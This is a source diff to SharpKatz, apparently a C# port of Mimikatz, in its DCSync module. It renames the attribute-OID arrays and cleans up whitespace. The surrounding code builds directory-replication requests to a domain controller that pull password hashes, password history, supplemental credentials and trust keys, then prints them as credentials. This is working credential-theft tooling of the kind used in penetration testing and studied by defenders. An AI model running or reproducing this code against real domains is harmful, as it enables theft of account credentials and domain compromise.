@@ -167,23 +167,24 @@ namespace SharpKatz.Module
                 0x5c, 0x5b, 0x11, 0x04, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x54, 0x18, 0x00, 0x01, 0x00, 0x02, 0x00, 0x28, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x82, 0xfc, 0xff, 0xff, 0x00
             };
 
-        static string[] kuhl_m_lsadump_dcsync_oids = {
-    szOID_ANSI_name,
-    szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
-    szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
-    szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
-    szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
-    szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
-    szOID_ANSI_currentValue,
-    szOID_isDeleted
-};
-        static string[] kuhl_m_lsadump_dcsync_oids_export = {
-    szOID_ANSI_name,
-    szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
-    szOID_ANSI_userAccountControl,
-    szOID_ANSI_unicodePwd,
-    szOID_isDeleted
-};
+        static string[] oids = {
+            szOID_ANSI_name,
+            szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
+            szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
+            szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
+            szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
+            szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
+            szOID_ANSI_currentValue,
+            szOID_isDeleted
+        };
+
+        static string[] oids_export = {
+            szOID_ANSI_name,
+            szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
+            szOID_ANSI_userAccountControl,
+            szOID_ANSI_unicodePwd,
+            szOID_isDeleted
+        };
 
         private static byte[] SessionKey;
         static SecurityCallbackDelegate rpcSecurityCallbackDelegate;
@@ -243,18 +244,19 @@ namespace SharpKatz.Module
 
                         if (alldata)
                         {
-                            partAttSet.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids_export.Length;
-                            partAttSet.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
+                            partAttSet.cAttrs = (uint)oids_export.Length;
+                            partAttSet.rgPartialAttr = new uint[oids.Length];
 
                             for (int i = 0; i < partAttSet.cAttrs; i++)
-                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], ref partAttSet.rgPartialAttr[i]);
+                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, oids_export[i], ref partAttSet.rgPartialAttr[i]);
                         }
                         else
                         {
-                            partAttSet.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids.Length;
-                            partAttSet.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
+                            partAttSet.cAttrs = (uint)oids.Length;
+                            partAttSet.rgPartialAttr = new uint[oids.Length];
+
                             for (int i = 0; i < partAttSet.cAttrs; i++)
-                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], ref partAttSet.rgPartialAttr[i]);
+                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, oids[i], ref partAttSet.rgPartialAttr[i]);
                         }
 
                         mSG_GETCHGREQ.pPartialAttrSet = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PARTIAL_ATTR_VECTOR_V1_EXT)));
@@ -268,7 +270,7 @@ namespace SharpKatz.Module
                             if (result == 0)
                             {
                                 MarshalReplicationData(mSG_GETCHGREPLY, alldata, exportpath);
-                                                                
+
                                 if (alldata)
                                 {
                                     mSG_GETCHGREQ.uuidInvocIdSrc = mSG_GETCHGREPLY.uuidInvocIdSrc;
@@ -845,7 +847,7 @@ namespace SharpKatz.Module
         {
             IntPtr pObjects = pmsgOut.pObjects;
             uint numObjects = pmsgOut.cNumObjects;
-            
+
             REPLENTINFLIST list = (REPLENTINFLIST)Marshal.PtrToStructure(pObjects, typeof(REPLENTINFLIST));
 
             while (numObjects > 0)
@@ -862,7 +864,7 @@ namespace SharpKatz.Module
                         ATTRVAL attrval = (ATTRVAL)Marshal.PtrToStructure(IntPtr.Add(attr.AttrVal.pAVal, (int)(j * sizeval)), typeof(ATTRVAL));
                         byte[] data = new byte[attrval.valLen];
                         Marshal.Copy(attrval.pVal, data, 0, (int)attrval.valLen);
-                        
+
                         switch ((ATT)attr.attrTyp)
                         {
                             //case ATT.ATT_CURRENT_VALUE:
@@ -903,7 +905,7 @@ namespace SharpKatz.Module
 
                 numObjects--;
 
-            } 
+            }
         }
 
 
@@ -1176,7 +1178,7 @@ namespace SharpKatz.Module
             }
             Console.WriteLine("[*]");
 
-            if(ntPwdHistory != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
+            if (ntPwdHistory != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
             {
                 Console.WriteLine("[*] Credentials:");
                 if (ntPwdHistory != null)
